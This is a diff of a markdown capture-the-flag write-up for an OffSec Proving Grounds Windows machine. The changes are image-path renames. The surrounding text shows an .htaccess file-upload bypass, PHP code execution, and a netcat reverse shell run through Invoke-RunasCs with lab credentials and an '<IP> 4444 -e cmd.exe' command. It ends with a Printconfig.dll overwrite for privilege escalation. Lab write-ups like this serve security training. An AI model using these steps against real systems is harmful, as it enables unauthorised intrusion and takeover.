@@ -16,7 +16,7 @@ description: "Offsec proving grounds play windows machine writeup"
 ---
 # Walkthough on Youtube
 
-[![youtube](/assets/images/CTF/Pg-Play/Access/yt.png)](https://youtu.be/h1Br5umYxwc)
+[![youtube](/assets/images/CTF/Proving_Grounds/Access/yt.png)](https://youtu.be/h1Br5umYxwc)
 
 ## Nmap
 
@@ -59,7 +59,7 @@ Service Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 ## File Upload Vulnerability
 
-![Upload 01](/assets/images/CTF/Pg-Play/Access/up1.png)
+![Upload 01](/assets/images/CTF/Proving_Grounds/Access/up1.png)
 
 Upload a `.htaccess` file to overwrite the file upload configuration in the apache.
 
@@ -71,16 +71,16 @@ AddType application/x-httpd-php .evil
 
 Upload the php remote code execution code to the server with extension as `rce.evil`
 
-![Upload 02](/assets/images/CTF/Pg-Play/Access/up2.png)
+![Upload 02](/assets/images/CTF/Proving_Grounds/Access/up2.png)
 
 ### RCE
 
-![RCE 01](/assets/images/CTF/Pg-Play/Access/rce1.png)
+![RCE 01](/assets/images/CTF/Proving_Grounds/Access/rce1.png)
 
 - Upload netcat windows binary to the server.
 - Obtain reverse shell by executing netcat command.
 
-![RCE 02](/assets/images/CTF/Pg-Play/Access/rce2.png)
+![RCE 02](/assets/images/CTF/Proving_Grounds/Access/rce2.png)
 
 - Transfer PowerView.ps1 to the attacking machine.
 
@@ -113,7 +113,7 @@ Copy the hash and crack it using john.
 
 **Crack the hash**
 
-![Crackthehash 02](/assets/images/CTF/Pg-Play/Access/crackhash.png)
+![Crackthehash 02](/assets/images/CTF/Proving_Grounds/Access/crackhash.png)
 
 Transfer [Invoke-Runas.ps1](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-Runas.ps1) to the attacking machine. The script will allow us to run commands as certain users in the system using the username and password.
 
@@ -124,7 +124,7 @@ Import-Module .\Invoke-RunasCs.ps1
 Invoke-RunasCs svc_mssql trustno1 'C:\xampp\htdocs\uploads\nc.exe <IP> 4444 -e cmd.exe'
 ```
 
-![Revshell 01](/assets/images/CTF/Pg-Play/Access/revshell1.png)
+![Revshell 01](/assets/images/CTF/Proving_Grounds/Access/revshell1.png)
 
 ## Privilege Escalation
 
@@ -164,7 +164,7 @@ Transfer the dll file to the attacking machine and overwrite the file to the bel
 
 `C:\Windows\system32\spool\drivers\x64\3\Printconfig.dll`
 
-![Copy](/assets/images/CTF/Pg-Play/Access/copy.png)
+![Copy](/assets/images/CTF/Proving_Grounds/Access/copy.png)
 
 Switch to powershell and use the below trigger to obtain root.
 
@@ -174,11 +174,11 @@ $object = [Activator]::CreateInstance($type)
 ```
 [More...](https://github.com/CsEnox/SeManageVolumeExploit)
 
-![trigger](/assets/images/CTF/Pg-Play/Access/trigger.png)
+![trigger](/assets/images/CTF/Proving_Grounds/Access/trigger.png)
 
 **Root shell Obtained**
 
-![trigger](/assets/images/CTF/Pg-Play/Access/root.png)
+![trigger](/assets/images/CTF/Proving_Grounds/Access/root.png)
 
 Thanks for reading!
 
